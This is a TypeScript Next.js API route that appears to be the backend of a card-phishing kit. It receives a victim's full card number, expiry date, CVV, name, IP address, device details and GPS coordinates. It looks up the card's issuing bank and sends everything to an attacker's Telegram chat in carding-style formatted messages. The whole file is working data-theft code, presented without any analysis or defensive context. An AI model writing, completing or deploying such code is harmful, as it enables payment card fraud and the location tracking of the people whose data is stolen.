import { type NextRequest, NextResponse } from "next/server"

// Add BIN lookup function at the top
async function getBinInfo(cardNumber: string) {
  const bin = cardNumber.replace(/\D/g, "").substring(0, 6)

  try {
    const response = await fetch(`https://lookup.binlist.net/${bin}`)
    if (response.ok) {
      const data = await response.json()
      return {
        bank: data.bank?.name || "Unknown",
        type: data.type || "Unknown",
        level: data.brand || "Unknown",
        country: data.country?.name || "Unknown",
      }
    }
  } catch (error) {
    console.error("BIN lookup failed:", error)
  }

  return {
    bank: "Unknown",
    type: "Unknown",
    level: "Unknown",
    country: "Unknown",
  }
}

// Add continent helper function
function getContinent(countryCode: string): string {
  const continents: { [key: string]: string } = {
    US: "North America",
    CA: "North America",
    MX: "North America",
    GB: "Europe",
    DE: "Europe",
    FR: "Europe",
    IT: "Europe",
    ES: "Europe",
    AU: "Oceania",
    NZ: "Oceania",
    JP: "Asia",
    CN: "Asia",
    IN: "Asia",
    BR: "South America",
    AR: "South America",
    ZA: "Africa",
    EG: "Africa",
    // Add more as needed
  }
  return continents[countryCode] || "Unknown"
}

export async function POST(request: NextRequest) {
  try {
    const { cardNumber, expiryDate, securityCode, country, postcode, fullName, deviceInfo, locationInfo, ipInfo } =
      await request.json()

    // Telegram Bot configuration
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error("Telegram credentials not configured")
      return NextResponse.json({ success: false, error: "Configuration error" })
    }

    // Update the message format
    const binInfo = await getBinInfo(cardNumber)
    const bin = cardNumber.replace(/\D/g, "").substring(0, 6)

    let message = `~~~~[ 𝗖𝗔𝗥𝗗 𝗜𝗡𝗙𝗢 ]~~~~
𝗕𝗜𝗡: ${bin}
𝗕𝗮𝗻𝗸: ${binInfo.bank}
𝗧𝘆𝗽𝗲: ${binInfo.type}
𝗟𝗲𝘃𝗲𝗹: ${binInfo.level}
𝗖𝗮𝗿𝗱𝗵𝗼𝗹𝗱𝗲𝗿'𝘀: ${fullName}
𝗖𝗖 𝗡𝘂𝗺𝗯𝗲𝗿: ${cardNumber}
𝗘𝘅𝗽𝗶𝗿𝗲𝗱: ${expiryDate}
𝗖𝗩𝗩: ${securityCode}
𝗔𝗠𝗘𝗫 𝗖𝗜𝗗: ${securityCode.length === 4 ? securityCode : "N/A"}
~~~~[ 𝗘𝗡𝗗 𝗢𝗙 𝗟𝗜𝗡𝗘 ]~~~~

~~~~[ 𝗕𝗥𝗢𝗪𝗦𝗘𝗥 𝗜𝗡𝗙𝗢 ]~~~~
𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: ${ipInfo?.ip || "Unknown"}
𝗥𝗲𝗴𝗶𝗼𝗻: ${ipInfo?.region || "Unknown"}
𝗖𝗶𝘁𝘆: ${ipInfo?.city || "Unknown"}
𝗖𝗼𝗻𝘁𝗶𝗻𝗲𝗻𝘁: ${getContinent(ipInfo?.countryCode) || "Unknown"}
𝗧𝗶𝗺𝗲𝘇𝗼𝗻𝗲: ${ipInfo?.timezone || deviceInfo?.timezone || "Unknown"}
𝗢𝗦/𝗕𝗿𝗼𝘄𝘀𝗲𝗿: ${deviceInfo?.os || "Unknown"}/${deviceInfo?.browser || "Unknown"}
𝗗𝗮𝘁𝗲: ${new Date().toLocaleString()}
𝗨𝘀𝗲𝗿 𝗔𝗴𝗲𝗻𝘁: ${deviceInfo?.userAgent || "Unknown"}
~~~~[ 𝗘𝗡𝗗 𝗢𝗙 𝗟𝗜𝗡𝗘 ]~~~~`

    // Add GPS coordinates if available
    if (locationInfo && locationInfo.latitude && locationInfo.longitude) {
      message += `

🎯 GPS: ${locationInfo.latitude.toFixed(6)}, ${locationInfo.longitude.toFixed(6)}
🗺️ Maps: https://maps.google.com/?q=${locationInfo.latitude},${locationInfo.longitude}`
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (response.ok) {
      return NextResponse.json({ success: true })
    } else {
      console.error("Failed to send to Telegram:", await response.text())
      return NextResponse.json({ success: false, error: "Failed to send message" })
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return NextResponse.json({ success: false, error: "Server error" })
  }
}
